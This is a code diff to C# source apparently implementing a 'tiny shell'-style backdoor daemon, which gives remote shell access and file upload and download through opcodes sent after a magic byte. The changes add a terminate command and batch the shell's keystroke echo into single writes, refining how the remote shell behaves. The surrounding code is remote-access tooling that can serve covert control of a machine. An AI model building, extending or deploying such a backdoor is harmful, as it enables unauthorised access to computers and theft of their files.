@@ -127,6 +127,9 @@ namespace Tshd
                 case 3: // RunShell
                     HandleRunShell(layer);
                     break;
+                case 4: // Terminate
+                    Environment.Exit(0);
+                    break;
             }
         }
 
@@ -271,6 +274,8 @@ namespace Tshd
                      List<byte> exitBuffer = new List<byte>();
 
                      while ((readLen = layer.Read(tmp, 0, tmp.Length)) > 0) {
+                         List<byte> echoBuffer = new List<byte>(); // Buffer for batched echo
+
                          // Check for magic command byte 0x1D
                          if (readLen >= 2 && tmp[0] == 0x1D) {
                              int opcode = tmp[1];
@@ -282,6 +287,7 @@ namespace Tshd
 
                              if (opcode == 1) { HandleGetFile(layer, extra); continue; }
                              if (opcode == 2) { HandlePutFile(layer, extra); continue; }
+                             if (opcode == 4) { Environment.Exit(0); }
                          }
 
                          for (int i = 0; i < readLen; i++)
@@ -311,7 +317,7 @@ namespace Tshd
                                  else
                                  {
                                      // Not a CSI sequence, process buffered ESC and this char as normal
-                                     ProcessChar(0x1B, layer, lineBuffer, p, history, ref historyIndex);
+                                     ProcessChar(0x1B, layer, lineBuffer, p, history, ref historyIndex, echoBuffer);
                                      escapeState = 0;
                                      // fall through to process b
                                  }
@@ -326,7 +332,7 @@ namespace Tshd
                                      {
                                          if (historyIndex > 0) historyIndex--;
                                          string cmd = history[historyIndex];
-                                         ReplaceLine(cmd, layer, lineBuffer);
+                                         ReplaceLine(cmd, layer, lineBuffer, echoBuffer);
                                      }
                                      continue;
                                  }
@@ -336,7 +342,7 @@ namespace Tshd
                                      {
                                          historyIndex++;
                                          string cmd = (historyIndex < history.Count) ? history[historyIndex] : "";
-                                         ReplaceLine(cmd, layer, lineBuffer);
+                                         ReplaceLine(cmd, layer, lineBuffer, echoBuffer);
                                      }
                                      continue;
                                  }
@@ -353,7 +359,14 @@ namespace Tshd
                                  continue;
                              }
 
-                             ProcessChar(b, layer, lineBuffer, p, history, ref historyIndex);
+                             ProcessChar(b, layer, lineBuffer, p, history, ref historyIndex, echoBuffer);
+                         }
+
+                         // Flush echo buffer
+                         if (echoBuffer.Count > 0)
+                         {
+                             byte[] echoBytes = echoBuffer.ToArray();
+                             layer.Write(echoBytes, 0, echoBytes.Length);
                          }
                      }
                  } catch {}
@@ -366,7 +379,7 @@ namespace Tshd
              p.WaitForExit();
         }
 
-        static void ProcessChar(byte b, Pel layer, List<byte> lineBuffer, Process p, List<string> history, ref int historyIndex)
+        static void ProcessChar(byte b, Pel layer, List<byte> lineBuffer, Process p, List<string> history, ref int historyIndex, List<byte> echoBuffer)
         {
              if (b == 0x08 || b == 0x7F) // Backspace (BS or DEL)
              {
@@ -374,12 +387,12 @@ namespace Tshd
                  {
                      lineBuffer.RemoveAt(lineBuffer.Count - 1);
                      byte[] bs = new byte[] { 0x1B, 0x5B, 0x44, 0x20, 0x1B, 0x5B, 0x44 };
-                     layer.Write(bs, 0, bs.Length);
+                     echoBuffer.AddRange(bs);
                  }
              }
              else if (b == 0x0D) // CR (\r)
              {
-                 layer.Write(new byte[] { 0x0D, 0x0A }, 0, 2);
+                 echoBuffer.AddRange(new byte[] { 0x0D, 0x0A });
                  lineBuffer.Add(0x0D);
                  lineBuffer.Add(0x0A);
                  byte[] line = lineBuffer.ToArray();
@@ -403,11 +416,11 @@ namespace Tshd
              else
              {
                  lineBuffer.Add(b);
-                 layer.Write(new byte[] { b }, 0, 1);
+                 echoBuffer.Add(b);
              }
         }
 
-        static void ReplaceLine(string cmd, Pel layer, List<byte> lineBuffer)
+        static void ReplaceLine(string cmd, Pel layer, List<byte> lineBuffer, List<byte> echoBuffer)
         {
              // Erase current buffer from screen
              // Send Backspace-Space-Backspace for each char in buffer
@@ -415,12 +428,12 @@ namespace Tshd
              byte[] eraseSeq = new byte[] { 0x1B, 0x5B, 0x44, 0x20, 0x1B, 0x5B, 0x44 }; // Left Space Left
 
              for(int i=0; i<lineBuffer.Count; i++) {
-                 layer.Write(eraseSeq, 0, eraseSeq.Length);
+                 echoBuffer.AddRange(eraseSeq);
              }
 
              // Write new cmd
              byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
-             layer.Write(cmdBytes, 0, cmdBytes.Length);
+             echoBuffer.AddRange(cmdBytes);
 
              // Update buffer
              lineBuffer.Clear();
